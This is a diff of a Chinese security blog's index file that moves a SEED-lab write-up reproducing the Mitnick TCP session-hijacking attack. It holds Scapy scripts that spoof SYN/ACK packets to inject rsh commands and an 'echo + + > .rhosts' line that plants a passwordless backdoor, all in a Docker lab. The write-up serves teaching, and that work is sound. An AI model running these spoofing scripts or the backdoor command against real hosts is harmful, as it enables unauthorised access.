@@ -17,80 +17,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MITNICK攻击实验</title>
-    <url>/posts/7fdadce9.html</url>
-    <content><![CDATA[<h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>KEVIN·MITNICK可能是美国最著名的黑客之一，他在联邦调查局的通缉犯名单上。在逃亡期间，他开始对破解移动网络产生了兴趣，并需要专门的软件来帮助他做到这一点。这让他找到了圣地亚哥超级计算机中心的研究员TSUTOMU SHIMOMURA，移动电话网络安全方面的主要研究人员之一。他有MITNICK想要的代码。</p>
-<p>1994年，MITNICK利用TCP协议中的漏洞和SHIMOMURA的两台计算机之间的受信任关系，成功地对SHIMOMURA的计算机发动了一次攻击。这次袭击引发了两人之间的对决，并最终导致了MITNICK的被捕。这场对决后来被演变成书籍和好莱坞电影。这次攻击现在被称为MITNICK攻击，这是一种特殊类型的TCP会话劫持。</p>
-<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>这个实验的目的是重现经典的MITNICK攻击，这样学生们就可以获得这种攻击的第一手经验。我们将模拟最初在SHIMOMURA电脑上的设置，然后启动MITNICK攻击，在SHIMOMURA的两台电脑之间创建一个伪造的TCP会话。如果攻击成功了，我们应该能够在SHIMOMURA的计算机上运行任何命令</p>
-<h2 id="实验主题"><a href="#实验主题" class="headerlink" title="实验主题"></a>实验主题</h2><ul>
-<li><p>TCP会话劫持攻击</p>
-</li>
-<li><p>TCP三次握手协议</p>
-</li>
-<li><p>MITNICK攻击</p>
-</li>
-<li><p>远程SHELL RSH</p>
-</li>
-<li><p>数据包嗅探与伪造</p>
-</li>
-</ul>
-<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h4 id="1-使用docker容器建立实验环境"><a href="#1-使用docker容器建立实验环境" class="headerlink" title="1. 使用docker容器建立实验环境"></a>1. 使用docker容器建立实验环境</h4><p>在网站<a href="http://202.120.1.66:1068/">Home</a>下载相关的环境安装包，然后再Ubuntu系统中打开。使用命令<code>docker-compose up</code>完成环境搭建以及容器启动。</p>
-<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/environment.png" alt="environment"></p>
-<h4 id="2-配置X-Terminal"><a href="#2-配置X-Terminal" class="headerlink" title="2. 配置X-Terminal"></a>2. 配置X-Terminal</h4><p>使用<code>docker exec -it [container-ID] /bin/bash</code>命令进入<code>x-terminal</code>主机，创建.rhost文件，添加<code>trust_server</code>主机IP地址</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">cd ~</span><br><span class="line">touch .rhosts</span><br><span class="line">echo 10.9.0.6 &gt; .rhosts</span><br><span class="line">chmod 644 .rhosts</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/x_terminal_rsh_config.png" alt="x_terminal_rsh_config"></p>
-<p>配置完成后，使用<code>Trust Server</code>主机进行<code>rsh</code>登录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">rsh 10.9.0.5 date</span><br></pre></td></tr></table></figure>
-
-<p> <img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/x_terminal_rsh_config_verify.png" alt="x_terminal_rsh_config_verify"></p>
-<p>另外还需要设置<code>arp</code>长期缓存，因为如果在进行<code>mitnick</code>攻击时，如果<code>X-Terminal</code>主机中没有<code>Trust Server</code>主机的<code>arp</code>缓存，<code>X-Terminal</code>会发出<code>arp</code>报文请求<code>Trust Server</code>MAC地址，然而<code>Trust Server</code>由于收到<code>SYN FLOODING</code>攻击无法给予回复，导致攻击无法继续向下进行。</p>
-<h4 id="3-模拟SYN-FLOODING攻击"><a href="#3-模拟SYN-FLOODING攻击" class="headerlink" title="3. 模拟SYN FLOODING攻击"></a>3. 模拟SYN FLOODING攻击</h4><p>由于当前主机都可以很好的防护SYN FLOODING攻击，可以直接关闭<code>Trust Server</code>主机来模拟SYN FLOODING攻击成功。</p>
-<h4 id="4-建立第一个TCP连接——伪造SYN包"><a href="#4-建立第一个TCP连接——伪造SYN包" class="headerlink" title="4. 建立第一个TCP连接——伪造SYN包"></a>4. 建立第一个TCP连接——伪造SYN包</h4><p>令<code>Trust Server</code>主机rsh远程登录<code>X-Terminal</code>主机，tcpdump查看包交互过程，如下图，可见<code>10.9.0.5</code>与<code>10.9.0.6</code>之间建立了两次TCP连接（<code>10.9.0.5:514 &lt;-&gt; 10.9.0.6:1023</code>, <code>10.9.0.5:1023 &lt;-&gt; 10.9.0.6:1022</code>）</p>
-<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/tcp_dump.png" alt="tcp_dump"></p>
-<p><code>mitnick</code>攻击实验进行TCP连接过程如下图：</p>
-<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/TCP.png" alt="TCP"></p>
-<p>使用<code>python scapy</code>库构造脚本，伪造SYN包，向<code>X-Terminal</code>伪造<code>Trust Server</code>发送SYN包，尝试建立连接。</p>
-<p><code>python</code>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.发送第一个SYN包</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">1023</span>, dport=<span class="number">514</span>)</span><br><span class="line">tcp.flags = <span class="string">&quot;S&quot;</span></span><br><span class="line">p = ip / tcp</span><br><span class="line">send(p, verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>构造ip头以及tcp，注意tcp源端口需要为”1023”，标志位需要为”S”，向<code>X-Terminal</code>主机发送SYN包。</p>
-<h4 id="5-建立第一个TCP连接——伪造SYN-ACK响应包"><a href="#5-建立第一个TCP连接——伪造SYN-ACK响应包" class="headerlink" title="5. 建立第一个TCP连接——伪造SYN-ACK响应包"></a>5. 建立第一个TCP连接——伪造SYN-ACK响应包</h4><p>发送SYN包后，<code>X-Terminal</code>会发送SYN+ACK响应包，<code>Attacker</code>主机需要伪造ACK响应包回复。其中包含了 ip, tcp, data等信息，data数据中包含了<code>touch /home/seed/xyz</code>命令。</p>
-<p><code>python</code>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.伪造SYN+ACK响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;SA&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">1023</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;A&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].ack</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line">        <span class="comment"># 伪造rsh数据包</span></span><br><span class="line">        data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br><span class="line">        p = ip / tcp / data</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific</span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>
-
-<p>进行sniff嗅探<code>X-Terminal</code>主机发送的SYN+ACK包，根据该包构造ip头和tcp头，设置标志位为”A”表示ACK包，注ack序号应为SYN+ACK包的<code>seq+1</code>，并添加rsh data数据段，添加命令，命令格式为<code>[port_number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00</code>  。</p>
-<p>数据包括四个部分：一个端口号、 一个客户端的用户ID、 一个服务器的用户ID和一个命令。该端口号将用于第二个连接。 客户端和服务器的用户ID在本实验中都为”seed” 。 这四个字段用一个字节0分隔。</p>
-<h4 id="6-建立第二个TCP连接——伪造ACK包"><a href="#6-建立第二个TCP连接——伪造ACK包" class="headerlink" title="6. 建立第二个TCP连接——伪造ACK包"></a>6. 建立第二个TCP连接——伪造ACK包</h4><p>建立第一个连接后，X-Terminal将启动第二次连接，rshd使用此连接来发送错误消息。在本实验中，这个连接不 会被使用。但如果这个连接没有建立，rshd将停止而不执行命令。因此，需要伪造第二个连接来确保命令的执行。  </p>
-<p>编写另一个程序，嗅探发送到可信服务器9090端口的TCP流量（假设之前使用9090端口）。当嗅探到一个SYN包时，应该用一个SYN+ACK包来响应。</p>
-<p>如果两个连接都已成功建立， 则rshd将执行包含在rsh数据包中的命令。 检查&#x2F;home&#x2F;seed&#x2F;文件夹， 并查看是否创建了&#x2F;home&#x2F;seed&#x2F;， 以及其时间戳是否与当前的时间相匹配 。</p>
-<p><code>python</code>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.伪造SYN响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;S&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">9090</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;SA&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].seq</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        p = ip / tcp</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific      </span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>
-
-<p>进行sniff嗅探<code>X-Terminal</code>主机发送第二次TCP连接的SYN包，根据该包构造ip头和tcp头，设置标志位为”SA”表示SYN+ACK包，注意ack序号应为SYN包的<code>seq+1</code>，seq序号可以随意设计。</p>
-<p>进行tcpdump查看包交互过程：</p>
-<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/sniff.png" alt="sniff"></p>
-<p><strong>结果检验：</strong></p>
-<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/results.png" alt="results"></p>
-<h4 id="7-设置后门"><a href="#7-设置后门" class="headerlink" title="7. 设置后门"></a>7. 设置后门</h4><p>为了避免每次侵入X-Terminal都需要发动攻击， 可以在X-Terminal上设置一个后门，这个后门允许攻击者无需输入密码就能在任何时候正常地登录到X-Terminal。实现这个后门需要做的就是将字符串“+ +” 添加到X-Terminal的 .rhosts 文件中，将脚本中data数据段命令修改为<code>echo + + &gt; /home/seed/.rhosts</code>即可。</p>
-<p><code>python</code>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>结果：</p>
-<p>成功修改了<code>.rhosts</code>文件</p>
-<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/result1.png" alt="result1"></p>
-<p>使用攻击主机进行rsh登录，成功返回日期时间</p>
-<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/result2.png" alt="result2"></p>
-<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过本次实验，我了解了当时mitnick进行攻击的具体过程以及实现原理。并且能够简单复现该攻击实验，并且熟练掌握了docker的使用方法。</p>
-]]></content>
-      <tags>
-        <tag>网络攻防</tag>
-        <tag>mitnick</tag>
-        <tag>实验报告</tag>
-        <tag>seed_lab</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</title>
     <url>/posts/30b50265.html</url>
     <content><![CDATA[<p>本文转载自[BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB](<a href="https://cloud.tencent.com/developer/article/1036206">BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)</p>
@@ -215,6 +141,80 @@
 ]]></content>
       <tags>
         <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MITNICK攻击实验</title>
+    <url>/posts/7fdadce9.html</url>
+    <content><![CDATA[<h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>KEVIN·MITNICK可能是美国最著名的黑客之一，他在联邦调查局的通缉犯名单上。在逃亡期间，他开始对破解移动网络产生了兴趣，并需要专门的软件来帮助他做到这一点。这让他找到了圣地亚哥超级计算机中心的研究员TSUTOMU SHIMOMURA，移动电话网络安全方面的主要研究人员之一。他有MITNICK想要的代码。</p>
+<p>1994年，MITNICK利用TCP协议中的漏洞和SHIMOMURA的两台计算机之间的受信任关系，成功地对SHIMOMURA的计算机发动了一次攻击。这次袭击引发了两人之间的对决，并最终导致了MITNICK的被捕。这场对决后来被演变成书籍和好莱坞电影。这次攻击现在被称为MITNICK攻击，这是一种特殊类型的TCP会话劫持。</p>
+<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>这个实验的目的是重现经典的MITNICK攻击，这样学生们就可以获得这种攻击的第一手经验。我们将模拟最初在SHIMOMURA电脑上的设置，然后启动MITNICK攻击，在SHIMOMURA的两台电脑之间创建一个伪造的TCP会话。如果攻击成功了，我们应该能够在SHIMOMURA的计算机上运行任何命令</p>
+<h2 id="实验主题"><a href="#实验主题" class="headerlink" title="实验主题"></a>实验主题</h2><ul>
+<li><p>TCP会话劫持攻击</p>
+</li>
+<li><p>TCP三次握手协议</p>
+</li>
+<li><p>MITNICK攻击</p>
+</li>
+<li><p>远程SHELL RSH</p>
+</li>
+<li><p>数据包嗅探与伪造</p>
+</li>
+</ul>
+<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h4 id="1-使用docker容器建立实验环境"><a href="#1-使用docker容器建立实验环境" class="headerlink" title="1. 使用docker容器建立实验环境"></a>1. 使用docker容器建立实验环境</h4><p>在网站<a href="http://202.120.1.66:1068/">Home</a>下载相关的环境安装包，然后再Ubuntu系统中打开。使用命令<code>docker-compose up</code>完成环境搭建以及容器启动。</p>
+<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/environment.png" alt="environment"></p>
+<h4 id="2-配置X-Terminal"><a href="#2-配置X-Terminal" class="headerlink" title="2. 配置X-Terminal"></a>2. 配置X-Terminal</h4><p>使用<code>docker exec -it [container-ID] /bin/bash</code>命令进入<code>x-terminal</code>主机，创建.rhost文件，添加<code>trust_server</code>主机IP地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">cd ~</span><br><span class="line">touch .rhosts</span><br><span class="line">echo 10.9.0.6 &gt; .rhosts</span><br><span class="line">chmod 644 .rhosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/x_terminal_rsh_config.png" alt="x_terminal_rsh_config"></p>
+<p>配置完成后，使用<code>Trust Server</code>主机进行<code>rsh</code>登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">rsh 10.9.0.5 date</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/x_terminal_rsh_config_verify.png" alt="x_terminal_rsh_config_verify"></p>
+<p>另外还需要设置<code>arp</code>长期缓存，因为如果在进行<code>mitnick</code>攻击时，如果<code>X-Terminal</code>主机中没有<code>Trust Server</code>主机的<code>arp</code>缓存，<code>X-Terminal</code>会发出<code>arp</code>报文请求<code>Trust Server</code>MAC地址，然而<code>Trust Server</code>由于收到<code>SYN FLOODING</code>攻击无法给予回复，导致攻击无法继续向下进行。</p>
+<h4 id="3-模拟SYN-FLOODING攻击"><a href="#3-模拟SYN-FLOODING攻击" class="headerlink" title="3. 模拟SYN FLOODING攻击"></a>3. 模拟SYN FLOODING攻击</h4><p>由于当前主机都可以很好的防护SYN FLOODING攻击，可以直接关闭<code>Trust Server</code>主机来模拟SYN FLOODING攻击成功。</p>
+<h4 id="4-建立第一个TCP连接——伪造SYN包"><a href="#4-建立第一个TCP连接——伪造SYN包" class="headerlink" title="4. 建立第一个TCP连接——伪造SYN包"></a>4. 建立第一个TCP连接——伪造SYN包</h4><p>令<code>Trust Server</code>主机rsh远程登录<code>X-Terminal</code>主机，tcpdump查看包交互过程，如下图，可见<code>10.9.0.5</code>与<code>10.9.0.6</code>之间建立了两次TCP连接（<code>10.9.0.5:514 &lt;-&gt; 10.9.0.6:1023</code>, <code>10.9.0.5:1023 &lt;-&gt; 10.9.0.6:1022</code>）</p>
+<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/tcp_dump.png" alt="tcp_dump"></p>
+<p><code>mitnick</code>攻击实验进行TCP连接过程如下图：</p>
+<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/TCP.png" alt="TCP"></p>
+<p>使用<code>python scapy</code>库构造脚本，伪造SYN包，向<code>X-Terminal</code>伪造<code>Trust Server</code>发送SYN包，尝试建立连接。</p>
+<p><code>python</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.发送第一个SYN包</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">1023</span>, dport=<span class="number">514</span>)</span><br><span class="line">tcp.flags = <span class="string">&quot;S&quot;</span></span><br><span class="line">p = ip / tcp</span><br><span class="line">send(p, verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>构造ip头以及tcp，注意tcp源端口需要为”1023”，标志位需要为”S”，向<code>X-Terminal</code>主机发送SYN包。</p>
+<h4 id="5-建立第一个TCP连接——伪造SYN-ACK响应包"><a href="#5-建立第一个TCP连接——伪造SYN-ACK响应包" class="headerlink" title="5. 建立第一个TCP连接——伪造SYN-ACK响应包"></a>5. 建立第一个TCP连接——伪造SYN-ACK响应包</h4><p>发送SYN包后，<code>X-Terminal</code>会发送SYN+ACK响应包，<code>Attacker</code>主机需要伪造ACK响应包回复。其中包含了 ip, tcp, data等信息，data数据中包含了<code>touch /home/seed/xyz</code>命令。</p>
+<p><code>python</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.伪造SYN+ACK响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;SA&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">1023</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;A&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].ack</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line">        <span class="comment"># 伪造rsh数据包</span></span><br><span class="line">        data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br><span class="line">        p = ip / tcp / data</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific</span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>
+
+<p>进行sniff嗅探<code>X-Terminal</code>主机发送的SYN+ACK包，根据该包构造ip头和tcp头，设置标志位为”A”表示ACK包，注ack序号应为SYN+ACK包的<code>seq+1</code>，并添加rsh data数据段，添加命令，命令格式为<code>[port_number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00</code>  。</p>
+<p>数据包括四个部分：一个端口号、 一个客户端的用户ID、 一个服务器的用户ID和一个命令。该端口号将用于第二个连接。 客户端和服务器的用户ID在本实验中都为”seed” 。 这四个字段用一个字节0分隔。</p>
+<h4 id="6-建立第二个TCP连接——伪造ACK包"><a href="#6-建立第二个TCP连接——伪造ACK包" class="headerlink" title="6. 建立第二个TCP连接——伪造ACK包"></a>6. 建立第二个TCP连接——伪造ACK包</h4><p>建立第一个连接后，X-Terminal将启动第二次连接，rshd使用此连接来发送错误消息。在本实验中，这个连接不 会被使用。但如果这个连接没有建立，rshd将停止而不执行命令。因此，需要伪造第二个连接来确保命令的执行。  </p>
+<p>编写另一个程序，嗅探发送到可信服务器9090端口的TCP流量（假设之前使用9090端口）。当嗅探到一个SYN包时，应该用一个SYN+ACK包来响应。</p>
+<p>如果两个连接都已成功建立， 则rshd将执行包含在rsh数据包中的命令。 检查&#x2F;home&#x2F;seed&#x2F;文件夹， 并查看是否创建了&#x2F;home&#x2F;seed&#x2F;， 以及其时间戳是否与当前的时间相匹配 。</p>
+<p><code>python</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.伪造SYN响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;S&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">9090</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;SA&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].seq</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        p = ip / tcp</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific      </span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>
+
+<p>进行sniff嗅探<code>X-Terminal</code>主机发送第二次TCP连接的SYN包，根据该包构造ip头和tcp头，设置标志位为”SA”表示SYN+ACK包，注意ack序号应为SYN包的<code>seq+1</code>，seq序号可以随意设计。</p>
+<p>进行tcpdump查看包交互过程：</p>
+<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/sniff.png" alt="sniff"></p>
+<p><strong>结果检验：</strong></p>
+<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/results.png" alt="results"></p>
+<h4 id="7-设置后门"><a href="#7-设置后门" class="headerlink" title="7. 设置后门"></a>7. 设置后门</h4><p>为了避免每次侵入X-Terminal都需要发动攻击， 可以在X-Terminal上设置一个后门，这个后门允许攻击者无需输入密码就能在任何时候正常地登录到X-Terminal。实现这个后门需要做的就是将字符串“+ +” 添加到X-Terminal的 .rhosts 文件中，将脚本中data数据段命令修改为<code>echo + + &gt; /home/seed/.rhosts</code>即可。</p>
+<p><code>python</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p>成功修改了<code>.rhosts</code>文件</p>
+<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/result1.png" alt="result1"></p>
+<p>使用攻击主机进行rsh登录，成功返回日期时间</p>
+<p><img src="/images/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/result2.png" alt="result2"></p>
+<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过本次实验，我了解了当时mitnick进行攻击的具体过程以及实现原理。并且能够简单复现该攻击实验，并且熟练掌握了docker的使用方法。</p>
+]]></content>
+      <tags>
+        <tag>网络攻防</tag>
+        <tag>mitnick</tag>
+        <tag>实验报告</tag>
+        <tag>seed_lab</tag>
       </tags>
   </entry>
   <entry>
@@ -477,44 +477,6 @@
       </tags>
   </entry>
   <entry>
-    <title>get_started_3dsctf_2016 WriteUp</title>
-    <url>/posts/3d8ffbc0.html</url>
-    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
-<li>对栈溢出函数带参数的溢出理解</li>
-</ul>
-<h2 id="解题内容"><a href="#解题内容" class="headerlink" title="解题内容"></a>解题内容</h2><ol>
-<li><p>使用<code>checksec</code>工具查看基本信息：</p>
